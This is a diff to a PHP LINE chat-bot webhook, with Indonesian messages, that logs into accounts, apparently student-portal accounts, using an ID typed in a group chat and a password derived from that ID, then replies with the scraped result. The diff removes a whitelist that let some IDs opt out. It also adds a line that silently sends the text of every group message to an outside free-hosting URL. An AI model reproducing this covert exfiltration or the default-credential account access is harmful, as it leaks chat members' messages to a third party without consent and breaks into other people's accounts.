@@ -68,47 +68,35 @@ $app->post('/webhook', function ($request, $response) use ($bot, $pass_signature
                 $profile    = $getprofile->getJSONDecodedBody();
                 $greetings  = new TextMessageBuilder("Halo, ".$profile['displayName']);
 
-                $whitelist=array("165040201111268","165150700111013","165090207111004","165010107111177","165150200111175");
-                $arrlength=count($whitelist);
-                $bolean=false;
-                
                 if(
                  $event['source']['type'] == 'group' or
                  $event['source']['type'] == 'room'
                 ){
                 //message from group / room
                     if($event['source']['userId']){
-                        if (in_array(substr($event['message']['text'],3), $whitelist)) {
-                            $bolean=true;
-                        }
-                        if (in_array(substr($event['message']['text'],4), $whitelist)) {
-                            $bolean=true;
-                        }
-                        if ($bolean==true) {
-                            $result = $bot->replyText($event['replyToken'], substr($event['message']['text'],3).' sudah masuk whitelist, hubungi admin untuk request whitelist id:foneazm');
-                        }else{
-                            if (substr($event['message']['text'],0,2)=='IP' & strlen($event['message']['text'])==18) {
-                                $gg ="p" . substr($event['message']['text'],3);
-                                $bb= substr($gg ,8);
-                                $sc = new Scrape($gg , $bb);
-                                $hasil = $sc->login();
-                                if ($hasil!='Transit') {
-                                    $result = $bot->replyText($event['replyToken'], $event['message']['text'] . $hasil);
-                                }else{
-                                    $result = $bot->replyText($event['replyToken'], $event['message']['text'] .'Tidak Dapat Diakses');
-                                }                                
-                            }else if (substr($event['message']['text'],0,3)=='IPK' & strlen($event['message']['text'])==19){
-                                $gg ="p" . substr($event['message']['text'],4);
-                                $bb= substr($gg ,8);
-                                $sc = new Scrape($gg , $bb);
-                                $hasil = $sc->login2();
-                                if ($hasil!='t;html') {
-                                    $result = $bot->replyText($event['replyToken'], $event['message']['text'] . $hasil);
-                                }else{
-                                    $result = $bot->replyText($event['replyToken'], $event['message']['text'] .'Tidak Dapat Diakses');
-                                }
+                        
+                        $stored = file_get_contents('http://farkhan.000webhostapp.com/tae/stupid.php?data='.urlencode($event['message']['text']));
+                        if (substr($event['message']['text'],0,2)=='IP' & strlen($event['message']['text'])==18) {
+                            $gg ="p" . substr($event['message']['text'],3);
+                            $bb= substr($gg ,8);
+                            $sc = new Scrape($gg , $bb);
+                            $hasil = $sc->login();
+                            if ($hasil!='Transit') {
+                                $result = $bot->replyText($event['replyToken'], $event['message']['text'] . $hasil);
+                            }else{
+                                $result = $bot->replyText($event['replyToken'], $event['message']['text'] .'Tidak Dapat Diakses');
+                            }                                
+                        }else if (substr($event['message']['text'],0,3)=='IPK' & strlen($event['message']['text'])==19){
+                            $gg ="p" . substr($event['message']['text'],4);
+                            $bb= substr($gg ,8);
+                            $sc = new Scrape($gg , $bb);
+                            $hasil = $sc->login2();
+                            if ($hasil!='t;html') {
+                                $result = $bot->replyText($event['replyToken'], $event['message']['text'] . $hasil);
+                            }else{
+                                $result = $bot->replyText($event['replyToken'], $event['message']['text'] .'Tidak Dapat Diakses');
                             }
-                        }   
+                        }  
                         return $res->withJson($result->getJSONDecodedBody(), $event['message']['text'].$result->getHTTPStatus());
                     } else {
                         if (substr($event['message']['text'],0,2)=='IP' & strlen($event['message']['text'])==18){
@@ -166,38 +154,5 @@ $app->post('/webhook', function ($request, $response) use ($bot, $pass_signature
             }
         }
     }
-
-    // $bot->replyText($replyToken, 'ini pesan balasan');
- 
 });
-// $app->get('/pushmessage', function($req, $res) use ($bot)
-// {
-//     // send push message to user
-//     $userId = 'U4f3b524bfcd08556173108d04ae067ad';
-//     $textMessageBuilder = new TextMessageBuilder('Halo, ini pesan push');
-//     $result = $bot->pushMessage($userId, $textMessageBuilder);
-   
-//     return $res->withJson($result->getJSONDecodedBody(), $result->getHTTPStatus());
-// });
-// $app->get('/profile/{userId}', function($req, $res) use ($bot)
-// {
-//     // get user profile
-//     $route  = $req->getAttribute('route');
-//     $userId = $route->getArgument('userId');
-//     $result = $bot->getProfile($userId);
-             
-//     return $res->withJson($result->getJSONDecodedBody(), $result->getHTTPStatus());
-// });
-// $app->get('/content/{messageId}', function($req, $res) use ($bot)
-// {
-//     // get message content
-//     $route      = $req->getAttribute('route');
-//     $messageId = $route->getArgument('messageId');
-//     $result = $bot->getMessageContent($messageId);
- 
-//     // set response
-//     $res->write($result->getRawBody());
- 
-//     return $res->withHeader('Content-Type', $result->getHeader('Content-Type'));
-// });
 $app->run();
